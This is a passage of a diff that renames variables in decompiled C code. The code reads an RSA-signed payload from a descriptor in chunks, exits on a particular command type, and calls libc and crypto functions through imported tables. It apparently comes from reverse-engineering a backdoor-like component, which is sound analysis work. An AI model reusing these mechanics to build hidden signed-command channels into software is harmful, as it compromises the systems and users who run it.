                        ((uint)rsa_signature_block[0] & 0xff00) << 8 | (uint)rsa_signature_block[0] << 0x18;
               rsa_signature_block[0] = CONCAT44(*(uint *)((u8 *)&rsa_signature_block[0] + 4),uVar11);
-              uVar33 = (ulong)uVar11;
-              if (uVar33 != 0) {
-                if (plVar5->read == (pfn_read_t)0x0) {
+              payload_remaining = (ulong)uVar11;
+              if (payload_remaining != 0) {
+                if (libc_funcs->read == (pfn_read_t)0x0) {
                   return FALSE;
                 }
-                if (plVar5->__errno_location == (pfn___errno_location_t)0x0) {
+                if (libc_funcs->__errno_location == (pfn___errno_location_t)0x0) {
                   return FALSE;
                 }
                 do {
                   while( TRUE ) {
-                    sVar20 = 0x200;
-                    if (uVar33 < 0x201) {
-                      sVar20 = uVar33;
+                    payload_size = 0x200;
+                    if (payload_remaining < 0x201) {
+                      payload_size = payload_remaining;
                     }
-                    sVar15 = (*plVar5->read)(iVar12,netlen_tmp,sVar20);
-                    if (-1 < sVar15) break;
-                    piVar16 = (*plVar5->__errno_location)();
-                    if (*piVar16 != 4) {
+                    io_result = (*libc_funcs->read)(status,netlen_tmp,payload_size);
+                    if (-1 < io_result) break;
+                    errno_slot = (*libc_funcs->__errno_location)();
+                    if (*errno_slot != 4) {
                       return FALSE;
                     }
                   }
-                  if (sVar15 == 0) {
+                  if (io_result == 0) {
                     return FALSE;
                   }
-                  uVar33 = uVar33 - sVar15;
-                } while (uVar33 != 0);
+                  payload_remaining = payload_remaining - io_result;
+                } while (payload_remaining != 0);
               }
-              if (uVar3 != 2) {
+              if (cmd_type != 2) {
                 return TRUE;
               }
-              if (plVar5->exit == (pfn_exit_t)0x0) {
+              if (libc_funcs->exit == (pfn_exit_t)0x0) {
                 return FALSE;
               }
-              (*plVar5->exit)(0);
+              (*libc_funcs->exit)(0);
               return TRUE;
             }
           }
         }
-        pBVar18 = (BIGNUM *)0x0;
-        pBVar17 = (BIGNUM *)0x0;
-        d = (BIGNUM *)0x0;
+        rsa_n_bn = (BIGNUM *)0x0;
+        rsa_e_bn = (BIGNUM *)0x0;
+        rsa_d_bn = (BIGNUM *)0x0;
 LAB_00108cd2:
-        (*ctx->imported_funcs->RSA_free)(r);
-        if (pBVar17 != (BIGNUM *)0x0) {
-          (*ctx->imported_funcs->BN_free)(pBVar17);
+        (*ctx->imported_funcs->RSA_free)(rsa_ctx);
+        if (rsa_e_bn != (BIGNUM *)0x0) {
+          (*ctx->imported_funcs->BN_free)(rsa_e_bn);
         }
-        if (pBVar18 != (BIGNUM *)0x0) {
-          (*ctx->imported_funcs->BN_free)(pBVar18);
+        if (rsa_n_bn != (BIGNUM *)0x0) {
+          (*ctx->imported_funcs->BN_free)(rsa_n_bn);
         }
-        if (d == (BIGNUM *)0x0) {
+        if (rsa_d_bn == (BIGNUM *)0x0) {
           return FALSE;
         }
-        (*ctx->imported_funcs->BN_free)(d);
+        (*ctx->imported_funcs->BN_free)(rsa_d_bn);
         return FALSE;
       }
-      lVar34 = 1;
+      digest_idx = 1;
     }
   }
   return FALSE;
